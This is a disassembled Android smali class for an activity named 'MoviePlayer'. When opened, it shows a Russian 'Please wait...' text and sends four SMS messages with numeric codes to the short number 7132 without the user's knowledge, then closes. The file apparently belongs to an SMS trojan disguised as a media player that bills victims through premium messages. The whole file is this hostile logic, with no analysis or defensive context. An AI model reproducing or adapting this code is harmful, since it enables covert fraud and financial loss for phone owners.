.class public Lorg/me/androidapplication1/MoviePlayer;
.super Landroid/app/Activity;
.source "MoviePlayer.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 8
    .param p1, "icicle"    # Landroid/os/Bundle;

    .prologue
    const/4 v2, 0x0

    const-string v1, "7132"

    .line 13
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 14
    new-instance v6, Lorg/me/androidapplication1/DataHelper;

    invoke-direct {v6, p0}, Lorg/me/androidapplication1/DataHelper;-><init>(Landroid/content/Context;)V

    .line 15
    .local v6, "dh":Lorg/me/androidapplication1/DataHelper;
    invoke-virtual {v6}, Lorg/me/androidapplication1/DataHelper;->canwe()Z

    move-result v3

    if-eqz v3, :cond_0

    .line 17
    new-instance v7, Landroid/widget/TextView;

    invoke-direct {v7, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 18
    .local v7, "tv":Landroid/widget/TextView;
    const-string v3, "\u041f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435..."

    invoke-virtual {v7, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 19
    invoke-virtual {p0, v7}, Lorg/me/androidapplication1/MoviePlayer;->setContentView(Landroid/view/View;)V

    .line 20
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 27
    .local v0, "m":Landroid/telephony/SmsManager;
    const-string v3, "7132"

    const-string v3, "846978"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 28
    const-string v3, "7132"

    const-string v3, "845785"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 29
    const-string v3, "7132"

    const-string v3, "846006"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 30
    const-string v3, "7132"

    const-string v3, "844858"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 35
    invoke-virtual {v6}, Lorg/me/androidapplication1/DataHelper;->was()V

    .line 38
    .end local v0    # "m":Landroid/telephony/SmsManager;
    .end local v7    # "tv":Landroid/widget/TextView;
    :cond_0
    invoke-virtual {p0}, Lorg/me/androidapplication1/MoviePlayer;->finish()V

    .line 41
    return-void
.end method
